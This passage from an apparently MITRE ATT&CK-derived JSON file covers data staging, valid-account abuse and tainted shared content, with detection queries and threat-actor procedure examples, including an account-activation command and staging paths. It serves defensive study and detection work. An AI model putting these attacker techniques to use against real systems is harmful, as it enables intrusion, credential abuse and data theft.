      "LoFiSecan save files to be evaluated for further exfiltration in theC:\\Programdata\\Microsoft\\andC:\\windows\\temp\\folders.[64]",
      "Lotus Blossomhas locally staged compressed and archived data for follow-on exfiltration.[65]",
      "Lumma Stealerhas configured a custom user data directory such as a folder within%USERPROFILE%\\AppData\\Roamingfor staging data.[66]",
      "LunarMailcan create a directory in%TEMP%\\to stage data prior to exfilration.[67]",
      "Machetestores files and logs in a folder on the local drive.[68][69]",
      "MacMahas stored collected files locally before exfiltration.[70]",
      "Mafaldacan place retrieved files into a destination directory.[71]",
      "MarkiRATcan store collected data locally in a created .nfo file.[72]",
      "menuPassstages data prior to exfiltration in multi-part archives, often saved in the Recycle Bin.[73]",
      "MESSAGETAPstored targeted SMS messages that matched its target list in CSV files on the compromised system.[74]",
      "metaMainhas stored the collected system files in a working directory.[71][75]",
      "Milanhas saved files prior to upload from a compromised host to folders beginning with the charactersa9850d2f.[76]",
      "Mis-Typehas temporarily stored collected information to the files\"%AppData%\\{Unique Identifier}\\HOSTRURKLSR\"and\"%AppData%\\{Unique Identifier}\\NEWERSSEMP\".[77]",
      "MoonWindsaves information from its keylogging routine as a .zip file in the present working directory.[78]",
      "MuddyWaterhas stored a decoy PDF file within a victim's%temp%folder.[79]",
      "Mustang Pandahas stored collected credential files inc:\\windows\\tempprior to exfiltration.Mustang Pandahas also stored documents for exfiltration in a hidden folder on USB drives.[80][81]",
      "NavRATwrites multiple outputs to a TMP file using the >> method.[82]",
      "NETWIREhas the ability to write collected data to a file created in the./LOGSdirectory.[83]",
      "NightClubhas copied captured files and keystrokes to the%TEMP%directory of compromised hosts.[84]",
      "NOKKIcan collect data from the victim and stage it inLOCALAPPDATA%\\MicroSoft Updatea\\uplog.tmp.[85]",
      "ObliqueRATcan copy specific files, webcam captures, and screenshots to local directories.[86]",
      "Octopushas stored collected information in the Application Data directory on a compromised host.[87][88]",
      "OilBoostercan stage files in thetempFilesdirectory for exfiltration.[89]",
      "OopsIEstages the output from command execution and collected files in specific folders before exfiltration.[90]",
      "DuringOperation Honeybee, stolen data was copied into a text file using the formatFrom <COMPUTER-NAME> (<Month>-<Day> <Hour>-<Minute>-<Second>).txtprior to compression, encoding, and exfiltration.[91]",
      "DuringOperation MidnightEclipse, threat actors copied files to the web application folder on compromised devices for exfiltration.[92]",
      "DuringOperation Wocao, threat actors staged archived files in a temporary directory prior to exfiltration.[93]",
      "PACEMAKERhas written extracted data totmp/dsserver-check.statementcounters.[94]",
      "Patchworkcopied all targeted files to a directory called index that was eventually uploaded to the C&C server.[16]",
      "PoisonIvystages collected data in a text file.[95]",
      "PowerLesscan stage stolen browser data inC:\\\\Windows\\\\Temp\\\\cup.tmpand keylogger data inC:\\\\Windows\\\\Temp\\\\Report.06E17A5A-7325-4325-8E5D-E172EBA7FC5BK.[96]",
      "Prikormkacreates a directory,%USERPROFILE%\\AppData\\Local\\SKC\\, which is used to store collected log files.[97]",
      "Pteranodoncreates various subdirectories under%Temp%\\reports\\%and copies files to those subdirectories. It also creates a folder atC:\\Users\\\\AppData\\Roaming\\Microsoft\\storeto store screenshot JPEG files.[98]",
      "PUNCHBUGGYhas saved information to a random temp file before exfil.[99]",
      "PUNCHTRACKaggregates collected data in a tmp file.[100]",
      "QakBothas stored stolen emails and other data into new folders prior to exfiltration.[101]",
      "RainyDaycan use a file exfiltration tool to copy files toC:\\ProgramData\\Adobe\\tempprior to exfiltration.[102]",
      "Ramsaycan stage data prior to exfiltration in%APPDATA%\\Microsoft\\UserSettingand%APPDATA%\\Microsoft\\UserSetting\\MediaCache.[103][104]",
      "Data captured byRawPOSis placed in a temporary file under a directory named \"memdump\".[105]",
      "Rovercopies files from removable drives toC:\\system.[106]",
      "Sagerunexgathers host information and stages it locally as a RAR file prior to exfiltration.[65]Sagerunexstores logged data in an encrypted file located at%TEMP%/TS_FB56.tmpduring execution.[107]",
      "SampleCheck5000can log the output from C2 commands in an encrypted and compressed format on disk prior to exfiltration.[89]",
      "Sidewinderhas collected stolen files in a temporary folder in preparation for exfiltration.[108]",
      "SLIGHTPULSEhas piped the output from executed commands to/tmp/1.[94]",
      "SLOWPULSEcan write logged ACE credentials to/home/perl/PAUS.pmin append mode, using the format string%s:%s\\n.[94]",
      "SocGholishcan send output fromwhoamito a local temp file using the naming conventionrad<5-hex-chars>.tmp.[109]",
      "SombRATcan store harvested data in a custom database under the %TEMP% directory.[110]",
      "SPACESHIPidentifies files with certain extensions and copies them to a directory in the user's profile.[44]",
      "STARWHALEhas stored collected data in a file calledstari.txt.[111]",
      "Storm-1811has locally staged captured credentials for subsequent manual exfiltration.[112]",
      "SUGARDUMPhas stored collected data under%<malware_execution_folder>%\\\\CrashLog.txt.[113]",
      "TeamTNThas aggregated collected credentials in text files before exfiltrating.[114]",
      "Threat Group-3390has locally staged encrypted archives for later exfiltration efforts.[115]",
      "Trojan.Karaganycan create directories to store plugin output and stage data for exfiltration.[116][117]",
      "Troll Stealerencrypts gathered information on victim devices prior to exfiltrating it through command and control infrastructure.[118]",
      "Turiancan store copied files in a specific directory prior to exfiltration.[14]",
      "Ursnifhas used tmp files to stage gathered information.[119]",
      "USBStealercollects files matching certain criteria from the victim and stores them in a local directory for later exfiltration.[120][121]",
      "VersaMemstaged captured credentials locally at/tmp/.temp.data.[122]",
      "Volt Typhoonhas saved stolen files including thentds.ditdatabase and theSYSTEMandSECURITYRegistry hives locally to theC:\\Windows\\Temp\\directory.[123][124]",
      "Wizard Spiderhas staged ZIP files in local directories such as,C:\\PerfLogs\\1\\andC:\\User\\1\\prior to exfiltration.[125]",
      "Zebrocystores all collected information in a single file before exfiltration.[126]"
    ]
  },
  "T1074.002": {
    "Name": "Data Staged:Remote Data Staging",
    "Description": "Adversaries may stage data collected from multiple systems in a central location or directory on one system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such asArchive Collected Data. Interactive command shells may be used, and common functionality withincmdand bash may be used to copy data into a staging location.In cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary mayCreate Cloud Instanceand stage data in that instance.[1]By staging data on one system prior to Exfiltration, adversaries can minimize the number of connections made to their C2 server and better evade detection.",
    "Detects": [
      "Monitor executed commands and arguments arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as Windows Management Instrumentation and PowerShell.",
      "Monitor processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files, such as 7zip, RAR, ZIP, or zlib.",
      "Monitor publicly writeable directories, central locations, and commonly used staging directories (recycle bin, temp folders, etc.) to regularly check for compressed or encrypted data that may be indicative of staging."
    ],
    "Procedure Examples": [
      "APT28has staged archives of collected data on a target's Outlook Web Access (OWA) server.[2]",
      "ccf32has copied files to a remote machine infected withChinoxyor another backdoor.[3]",
      "Chimerahas staged stolen data on designated servers in the target environment.[4]",
      "FIN6actors have compressed data from remote systems and moved it to another staging system before exfiltration.[5]",
      "FIN8aggregates staged data from a network into a single location.[6]",
      "Leviathanhas staged data remotely prior to exfiltration.[7]",
      "menuPasshas staged data on remote MSP systems or other victim networks prior to exfiltration.[8][9]",
      "MoustachedBouncerhas used plugins to save captured screenshots to.\\AActdata\\on an SMB share.[10]",
      "DuringNight Dragon, threat actors copied files to company web servers and subsequently downloaded them.[11]",
      "Sea Turtlestaged collected email archives in the public web directory of a website that was accessible from the internet.[12]",
      "During theSolarWinds Compromise,APT29staged data and files in password-protected archives on a victim's OWA server.[13]",
      "Threat Group-3390has moved staged encrypted archives to Internet-facing servers that had previously been compromised withChina Chopperprior to exfiltration.[14]",
      "ToddyCatmanually transferred collected files to an exfiltration host using xcopy.[15]"
    ]
  },
  "T1078": {
    "Name": "Valid Accounts",
    "Description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.[1]Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.In some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.[2]The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.[3]",
    "Detects": [
      "Monitor for newly constructed logon behavior that may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).sourcetype=\"WinEventLog:Security\" EventCode=4624 | stats count by _time, user, src_ip, dest_ip, LogonType| where LogonType IN (\"2\", \"10\")  // Interactive or RDP logon| eval is_suspicious=if(src_ip!=\"expected_ip\", \"True\", \"False\")| where is_suspicious=\"True\"| table _time, user, src_ip, dest_ip, LogonType",
      "Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account.",
      "Monitor for an attempt by a user that may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion."
    ],
    "Procedure Examples": [
      "During the2015 Ukraine Electric Power Attack,Sandworm Teamused valid accounts on the corporate network to escalate privileges, move laterally, and establish persistence within the corporate network.[4]",
      "Akirauses valid account information to remotely access victim networks, such as VPN credentials.[5][6][7]",
      "APT18actors leverage legitimate credentials to log into external remote services.[8]",
      "APT28has used legitimate credentials to gain initial access, maintain access, and exfiltrate data from a victim network. The group has specifically used credentials stolen through a spearphishing email to login to the DCCC network. The group has also leveraged default manufacturer's passwords to gain initial access to corporate networks via IoT devices such as a VOIP phone, printer, and video decoder.[9][10][11][12]",
      "APT29has used a compromised account to access an organization's VPN infrastructure.[13]",
      "APT33has used valid accounts for initial access and privilege escalation.[14][15]",
      "APT39has used stolen credentials to compromise Outlook Web Access (OWA).[16]",
      "APT41used compromised credentials to log on to other systems.[17][18]",
      "Axiomhas used previously compromised administrative accounts to escalate privileges.[19]",
      "BlackBytehas gained access to victim environments through legitimate VPN credentials.[20]",
      "During theC0032campaign,TEMP.Velesused compromised VPN accounts.[21]",
      "Carbanakactors used legitimate credentials of banking employees to perform operations that sent them millions of dollars.[22]",
      "Chimerahas used a valid account to maintain persistence via scheduled task.[23]",
      "Cinnamon Tempesthas used compromised user accounts to deploy payloads and create system services.[24]",
      "Dragonflyhas compromised user credentials and used valid accounts for operations.[25][26][27]",
      "Dtrackused hard-coded credentials to gain access to a network share.[28]",
      "Adversaries can instructDuquto spread laterally by copying itself to shares it has enumerated and for which it has obtained legitimate credentials (via keylogging or other means). The remote host is then infected by using the compromised credentials to schedule a task on remote machines that executes the malware.[29]",
      "FIN10has used stolen credentials to connect remotely to victim networks using VPNs protected with only a single factor.[30]",
      "FIN4has used legitimate credentials to hijack email communications.[31][32]",
      "FIN5has used legitimate VPN, RDP, Citrix, or VNC credentials to maintain access to a victim environment.[33][34][35]",
      "To move laterally on a victim network,FIN6has used credentials stolen from various systems on which it gathered usernames and password hashes.[36][37][38]",
      "FIN7has harvested valid administrative credentials for lateral movement.[39]",
      "FIN8has used valid accounts for persistence and lateral movement.[40]",
      "Fox Kittenhas used valid credentials with various services during lateral movement.[41]",
      "GALLIUMleveraged valid accounts to maintain access to a victim network.[42]",
      "DuringHomeLand Justice, threat actors used a compromised Exchange account to search mailboxes and create new Exchange accounts.[43]",
      "INC Ransomhas used compromised valid accounts for access to victim environments.[44][45][46][47]",
      "Indrik Spiderhas used valid accounts for initial access and lateral movement.[48]Indrik Spiderhas also maintained access to the victim environment through the VPN infrastructure.[48]",
      "Industroyercan use supplied user credentials to execute processes and stop services.[49]",
      "Ke3changhas used credential dumpers or stealers to obtain legitimate credentials, which they used to gain access to victim accounts.[50]",
      "Kinsinghas used valid SSH credentials to access remote hosts.[51]",
      "LAPSUS$has used compromised credentials and/or session tokens to gain access into a victim's VPN, VDI, RDP, and IAMs.[52][53]",
      "Lazarus Grouphas used administrator credentials to gain access to restricted network segments.[54]",
      "Leviathanhas obtained valid accounts to gain initial access.[55][56][57]",
      "Leviathanused captured, valid account information to log into victim web applications and appliances duringLeviathan Australian Intrusions.[57]",
      "Linux Rabbitacquires valid SSH accounts through brute force.[58]",
      "menuPasshas used valid accounts including shared between Managed Service Providers and clients to move between the two environments.[59][60][61][62]",
      "DuringNight Dragon, threat actors used compromised VPN accounts to gain access to victim systems.[63]",
      "OilRighas used compromised credentials to access other systems on a victim network.[64][65][18][66]",
      "DuringOperation MidnightEclipse, threat actors extracted sensitive credentials while moving laterally through compromised networks.[67]",
      "DuringOperation Wocao, threat actors used valid VPN credentials to gain initial access.[68]",
      "PittyTigerattempts to obtain legitimate credentials during operations.[69]",
      "Playhas used valid VPN accounts to achieve initial access.[70]",
      "POLONIUMhas used valid compromised credentials to gain access to victim environments.[71]",
      "Sandworm Teamhave used previously acquired legitimate credentials prior to attacks.[72]",
      "Sea Turtleused compromised credentials to maintain long-term access to victim environments.[73]",
      "SomeSeaDukesamples have a module to extract email from Microsoft Exchange servers using compromised credentials.[74]",
      "Silencehas used compromised credentials to log on to other systems and escalate privileges.[75]",
      "Silent Librarianhas used compromised credentials to obtain unauthorized access to online accounts.[76]",
      "During theSolarWinds Compromise,APT29used different compromised credentials for remote access and to move laterally.[77][78][79]",
      "Star Blizzardhas used stolen credentials to sign into victim email accounts.[80][81]",
      "Suckflyused legitimate account credentials that they dumped to navigate the internal victim network as though they were the legitimate account owner.[82]",
      "Threat Group-3390actors obtain legitimate credentials using a variety of methods and use them to further lateral movement on victim networks.[83]",
      "Volt Typhoonrelies primarily on valid credentials for persistence.[84]",
      "Wizard Spiderhas used valid credentials for privileged accounts with the goal of accessing domain controllers.[85][86]"
    ]
  },
  "T1078.001": {
    "Name": "Valid Accounts:Default Accounts",
    "Description": "Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS, the root user account in ESXi, and the default service account in Kubernetes.[1][2][3]Default accounts are not limited to client machines; rather, they also include accounts that are preset for equipment such as network devices and computer applications, whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolenPrivate Keysor credential materials to legitimately connect to remote environments viaRemote Services.[4]Default accounts may be created on a system after initial setup by connecting or integrating it with another application. For example, when an ESXi server is connected to a vCenter server, a default privileged account calledvpxuseris created on the ESXi server. If a threat actor is able to compromise this account’s credentials (for example, viaExploitation for Credential Accesson the vCenter host), they will then have access to the ESXi server.[5][6]",
    "Detects": [
      "Monitor for newly constructed logon behavior across default accounts that have been activated or logged into. These audits should also include checks on any appliances and applications for default credentials or SSH keys, and if any are discovered, they should be updated immediately.",
      "Monitor for logins to default accounts outside of expected contexts. For example, in ESXi environments, monitor the/var/log/hostd.logfile for logins to thevpxuserdefault user account that do not come from the vCenter server IP or use theVMWare-Client/X.X.Xuser-agent.[14]"
    ],
    "Procedure Examples": [
      "Ember Bearhas abused default user names and passwords in externally-accessible IP cameras for initial access.[7]",
      "FIN13has leveraged default credentials for authenticating myWebMethods (WMS) and QLogic web management interface to gain initial access.[8]",
      "DuringHomeLand Justice, threat actors used the built-in administrator account to move laterally using RDP andImpacket.[9]",
      "HyperStackcan use default credentials to connect to IPC$ shares on remote machines.[10]",
      "Magic Houndenabled and used the default system managed account, DefaultAccount, via\"powershell.exe\" /c net user DefaultAccount /active:yesto connect to a targeted Exchange server over RDP.[11]",
      "Stuxnetinfected WinCC machines via a hardcoded database server password.[12]"
    ]
  },
  "T1078.002": {
    "Name": "Valid Accounts:Domain Accounts",
    "Description": "Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.[1]Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.[2]Adversaries may compromise domain accounts, some with a high level of privileges, through various means such asOS Credential Dumpingor password reuse, allowing access to privileged resources of the domain.",
    "Detects": [
      "Monitor for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account.A remote desktop logon, throughRemote Desktop Protocol, may be typical of a system administrator or IT support, but only from select workstations. Monitoring remote desktop logons and comparing to known/approved originating systems can detect lateral movement of an adversary.Multiple users logged into a single machine at the same time, or even within the same hour, do not typically occur in networks we have observed.Logon events are Windows Event Code 4624 for Windows Vista and above, 518 for pre-Vista. Logoff events are 4634 for Windows Vista and above, 538 for pre-Vista. Logon types 2, 3, 9 and 10 are of interest. For more details see the Logon Types table on Microsoft’s Audit Logon Events page.Analytic 1 - Remote Desktop Logon(source=\"*WinEventLog:Security\" EventCode=\"4624\") AuthenticationPackageName= \"Negotiate\" AND Severity= \"Information\" AND logon_type= \"10\"",
      "Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).",
      "Monitor for an attempt by a user to gain access to a network or computing resource, often by the use of domain authentication services, such as the System Security Services Daemon (sssd) on LinuxNote:For Windows, Security Logs events, including Event ID 4624, can be monitored to track user login behavior.For Linux, auditing frameworks that support File Integrity Monitoring (FIM), including the audit daemon (auditd), can be used to alert on changes to files that store login information. These files include:/etc/login.defs,/etc/securetty,/var/log/faillog,/var/log/lastlog,/var/log/tallylog.For MacOS, auditing frameworks that support capturing information on user logins, such as OSQuery, can be used to audit user account logins and authentications."
    ],
    "Procedure Examples": [
      "Agriusattempted to acquire valid credentials for victim environments through various means to enable follow-on lateral movement.[3]",
      "APT3leverages valid accounts after gaining credentials for use within the victim domain.[4]",
      "APT5has used legitimate account credentials to move laterally through compromised environments.[5]",
      "Aquatic Pandaused multiple mechanisms to capture valid user accounts for victim domains to enable lateral movement and access to additional hosts in victim environments.[6]",
      "BlackBytecaptured credentials for or impersonated domain administration users.[7][8]",
      "Chimerahas used compromised domain accounts to gain access to the target environment.[9]",
      "Cinnamon Tempesthas obtained highly privileged credentials such as domain administrator in order to deploy malware.[10]",
      "Cobalt Strikecan use known credentials to run commands and spawn processes as a domain user account.[11][12][13]",
      "CreepySnailcan use stolen credentials to authenticate on target networks.[14]",
      "DuringCutting Edge, threat actors used compromised VPN accounts for lateral movement on targeted networks.[15]",
      "Indrik Spiderhas collected credentials from infected systems, including domain accounts.[16]",
      "Leviathancompromised domain credentials duringLeviathan Australian Intrusions.[17]",
      "Magic Houndhas used domain administrator accounts after dumping LSASS process memory.[18]",
      "Naikonhas used administrator credentials for lateral movement in compromised networks.[19]",
      "DuringNight Dragon, threat actors used domain accounts to gain further access to victim systems.[20]",
      "OilRighas used an exfiltration tool named STEALHOOK to retreive valid domain credentials.[21]",
      "DuringOperation CuckooBees, the threat actors used compromised domain administrator credentials as part of their lateral movement.[22]",
      "ForOperation Ghost,APT29used stolen administrator credentials for lateral movement on compromised networks.[23]",
      "DuringOperation MidnightEclipse, threat actors used a compromised domain admin account to move laterally.[24]",
      "DuringOperation Wocao, threat actors used domain credentials, including domain admin, for lateral movement and privilege escalation.[25]",
      "Playhas used valid domain accounts for access.[26]",
      "Ryukcan use stolen domain admin accounts to move laterally within a victim domain.[27]",
      "Sandworm Teamhas used stolen credentials to access administrative accounts within the domain.[28][29]",
      "IfShamooncannot access shares using current privileges, it attempts access using hard coded, domain-specific credentials gathered earlier in the intrusion.[30][31]",
      "During theSolarWinds Compromise,APT29used domain administrators' accounts to help facilitate lateral movement on compromised networks.[32]",
      "Stuxnetattempts to access network resources with a domain account’s credentials.[33]",
      "TA505has used stolen domain admin accounts to compromise additional hosts.[34]",
      "Threat Group-1314actors used compromised domain credentials for the victim's endpoint management platform, Altiris, to move laterally.[35]",
      "ToddyCathas used compromised domain admin credentials to mount local network shares.[36]",
      "Volt Typhoonhas used compromised domain accounts to authenticate to devices on compromised networks.[37][38][39]",
      "Wizard Spiderhas used administrative accounts, including Domain Admin, to move laterally within a victim network.[40]"
    ]
  },
  "T1078.003": {
    "Name": "Valid Accounts:Local Accounts",
    "Description": "Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.Local Accounts may also be abused to elevate privileges and harvest credentials throughOS Credential Dumping. Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement.",
    "Detects": [
      "Monitor for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account.A remote desktop logon, throughRemote Desktop Protocol, may be typical of a system administrator or IT support, but only from select workstations. Monitoring remote desktop logons and comparing to known/approved originating systems can detect lateral movement of an adversary.Multiple users logged into a single machine at the same time, or even within the same hour, do not typically occur in networks we have observed.Logon events are Windows Event Code 4624 for Windows Vista and above, 518 for pre-Vista. Logoff events are 4634 for Windows Vista and above, 538 for pre-Vista. Logon types 2, 3, 9 and 10 are of interest. For more details see the Logon Types table on Microsoft’s Audit Logon Events page.Analytic 1 - Remote Desktop Logon(source=\"*WinEventLog:Security\" EventCode=\"4624\") AuthenticationPackageName= \"Negotiate\" AND Severity= \"Information\" AND logon_type= \"10\"",
      "Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).",
      "Monitor for an attempt by a user to gain access to a network or computing resource, often by the use of domain authentication services, such as the System Security Services Daemon (sssd) on Linux.Notes: For Linux, auditing frameworks such as the audit daemon (auditd) can be used to alert on changes to log files that track authentication attempts, including/var/log/secure."
    ],
    "Procedure Examples": [
      "APT29targets dormant or inactive user accounts, accounts belonging to individuals no longer at the organization but whose accounts remain on the system, for access and persistence.[1]",
      "APT32has used legitimate local admin account credentials.[2]",
      "Cobalt Strikecan use known credentials to run commands and spawn processes as a local user account.[3][4]",
      "Emotetcan brute force a local admin password, then use it to facilitate lateral movement.[5]",
      "FIN10has moved laterally using the Local Administrator account.[6]",
      "FIN7has used compromised credentials for access as SYSTEM on Exchange servers.[7]",
      "HAFNIUMhas used the NT AUTHORITY\\SYSTEM account to create files on Exchange servers.[8]",
      "Kimsukyhas used a tool called GREASE to add a Windows admin account in order to allow them continued access via RDP.[9]",
      "Leviathanused captured local account information, such as service accounts, for actions duringLeviathan Australian Intrusions.[10]",
      "LockBit 3.0can use a compromised local account for lateral movement.[11]",
      "NotPetyacan use valid credentials withPsExecorwmicto spread itself to remote systems.[12][13]",
      "DuringOperation Wocao, threat actors used local account credentials found during the intrusion for lateral movement and privilege escalation.[14]",
      "Playhas used valid  local accounts to gain initial access.[15]",
      "PROMETHIUMhas created admin accounts on a compromised host.[16]",
      "Sea Turtlecompromised cPanel accounts in victim environments.[17]",
      "During theSolarWinds Compromise,APT29used compromised local accounts to access victims' networks.[18]",
      "Tropic Trooperhas used known administrator account credentials to execute the backdoor directly.[19]",
      "Turlahas abused local accounts that have the same password across the victim’s network.[20]",
      "Umbreoncreates valid local users to provide access to the system.[21]",
      "Velvet Antaccessed vulnerable Cisco switch devices using accounts with administrator privileges.[22]"
    ]
  },
  "T1078.004": {
    "Name": "Valid Accounts:Cloud Accounts",
    "Description": "Valid accounts in cloud environments may allow adversaries to perform actions to achieve Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. Cloud Accounts can exist solely in the cloud; alternatively, they may be hybrid-joined between on-premises systems and the cloud through syncing or federation with other identity sources such as Windows Active Directory.[1][2][3]Service or user accounts may be targeted by adversaries throughBrute Force,Phishing, or various other means to gain access to the environment. Federated or synced accounts may be a pathway for the adversary to affect both on-premises systems and cloud environments - for example, by leveraging shared credentials to log ontoRemote Services. High privileged cloud accounts, whether federated, synced, or cloud-only, may also allow pivoting to on-premises environments by leveraging SaaS-basedSoftware Deployment Toolsto run commands on hybrid-joined devices.An adversary may create long lastingAdditional Cloud Credentialson a compromised cloud account to maintain persistence in the environment. Such credentials may also be used to bypass security controls such as multi-factor authentication.Cloud accounts may also be able to assumeTemporary Elevated Cloud Accessor other privileges through various means within the environment. Misconfigurations in role assignments or role assumption policies may allow an adversary to use these mechanisms to leverage permissions outside the intended scope of the account. Such over privileged accounts may be used to harvest sensitive data from online storage accounts and databases throughCloud APIor other methods. For example, in Azure environments, adversaries may target Azure Managed Identities, which allow associated Azure resources to request access tokens. By compromising a resource with an attached Managed Identity, such as an Azure VM, adversaries may be able toSteal Application Access Tokens to move laterally across the cloud environment.[4]",
    "Detects": [
      "Monitor for suspicious account behavior across cloud services that share account.",
      "Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).",
      "Monitor the activity of cloud accounts to detect abnormal or malicious behavior, such as accessing information outside of the normal function of the account, account usage at atypical hours, or account authentication from unexpected locations or IP addresses. Service accounts should only be accessible from IP addresses from within the cloud environment.[24]For example, in Azure AD environments, consider using Identity Protection to flag risky sign-ins based on location, device compliance, and other factors. In Okta environments, configure Suspicious Activity Reporting to allow users to report suspicious logins and other behavior they do not recognize.[25]Analytic 1 - Anomalous IP addresses, unmanaged devices, unusual User Agents indicating automation tools or scriptsNote: To detect suspicious logins to cloud accounts using valid credentials from unusual sources.\"`index=\"\"m365_audit_logs\"\" Operation=\"\"UserLoggedIn\"\" ResultStatus=\"\"Success\"\"| stats count by ClientIP, UserId, DeviceProperties| where ClientIP!=\"\"expected_ip\"\" OR DeviceProperties!=\"\"expected_properties\"\"\""
    ],
    "Procedure Examples": [
      "APT28has used compromised Office 365 service accounts with Global Administrator privileges to collect email from user inboxes.[5]",
      "APT29has gained access to a global administrator account in Azure AD and has usedService Principalcredentials in Exchange.[6][7]",
      "APT33has used compromised Office 365 accounts in tandem withRulerin an attempt to gain control of endpoints.[8]",
      "APT5has accessed Microsoft M365 cloud environments using stolen credentials.[9]",
      "DuringC0027,Scattered Spiderleveraged compromised credentials from victim users  to authenticate to Azure tenants.[10]",
      "HAFNIUMhas abused service principals in compromised environments to enable data exfiltration.[11]",
      "Ke3changhas used compromised credentials to sign into victims’ Microsoft 365 accounts.[12]",
      "LAPSUS$has used compromised credentials to access cloud assets within a target organization.[13]",
      "Paculeverages valid cloud accounts to perform most of its operations.[14]",
      "Peiratescan use stolen service account tokens to perform its operations.[15]",
      "ROADToolsleverages valid cloud credentials to perform enumeration operations using the internal Azure AD Graph API.[16]",
      "During theSolarWinds Compromise,APT29used a compromised O365 administrator account to create a new Service Principal.[17]"
    ]
  },
  "T1080": {
    "Name": "Taint Shared Content",
    "Description": "Adversaries may deliver payloads to remote systems by adding content to shared storage locations, such as network drives or internal code repositories. Content stored on network drives or in other shared locations may be tainted by adding malicious programs, scripts, or exploit code to otherwise valid files. Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary's code on a remote system. Adversaries may use tainted shared content to move laterally.A directory share pivot is a variation on this technique that uses several other techniques to propagate malware when users access a shared network directory. It usesShortcut Modificationof directory .LNK files that useMasqueradingto look like the real directories, which are hidden throughHidden Files and Directories. The malicious .LNK-based directories have an embedded command that executes the hidden malware file in the directory and then opens the real intended directory so that the user's expected action still occurs. When used with frequently used network directories, the technique may result in frequent reinfections and broad access to systems and potentially to new and higher privileged accounts.[1]Adversaries may also compromise shared network directories through binary infections by appending or prepending its code to the healthy binary on the shared network directory. The malware may modify the original entry point (OEP) of the healthy binary to ensure that it is executed before the legitimate code. The infection could continue to spread via the newly infected file when it is executed by a remote system. These infections may target both binary and non-binary formats that end with extensions including, but not limited to, .EXE, .DLL, .SCR, .BAT, and/or .VBS.",
    "Detects": [
      "Monitor for newly constructed files from files that write or overwrite many files to a network shared directory may be suspicious. Monitor for the creation of hidden files and directories that may be used to conceal malicious files or scripts on shared network locations.sourcetype=\"WinEventLog:Security\" EventCode=4663 OR sourcetype=\"linux:audit\" syscall IN (\"creat\", \"open\")| search ObjectType=\"File\" AccessMask=\"0x2\" // 0x2 indicates write access| stats count by ObjectName, AccountName, ProcessName, SourceIPAddress, _time| eval suspicious=if(match(ObjectName, \"\\.exe$|\\.lnk$|\\.scr$|\\.bat$|\\.vbs$\") AND AccountName!=\"known_admin_user\", \"suspicious\", \"normal\")",
      "Monitor for files that write or overwrite many files to a network shared directory may be suspicious.Track file modification events in shared directories, especially modifications that alter executables or scripts. Monitor for signs of binary tampering, such as changes to .DLL or .EXE files that were previously trusted. Look for metadata changes, such as new authors or timestamps inconsistent with expected changes.sourcetype=\"WinEventLog:Security\" EventCode=4663 OR sourcetype=\"linux:audit\" syscall=\"write\"| search ObjectType=\"File\" AccessMask=\"0x2\"| stats count by ObjectName, AccountName, ProcessName, SourceIPAddress, _time| eval modification_suspicious=if(match(ObjectName, \"\\.exe$|\\.dll$|\\.lnk$\") AND ProcessName!=\"approved_tool.exe\", \"suspicious\", \"normal\")| where modification_suspicious=\"suspicious\"",
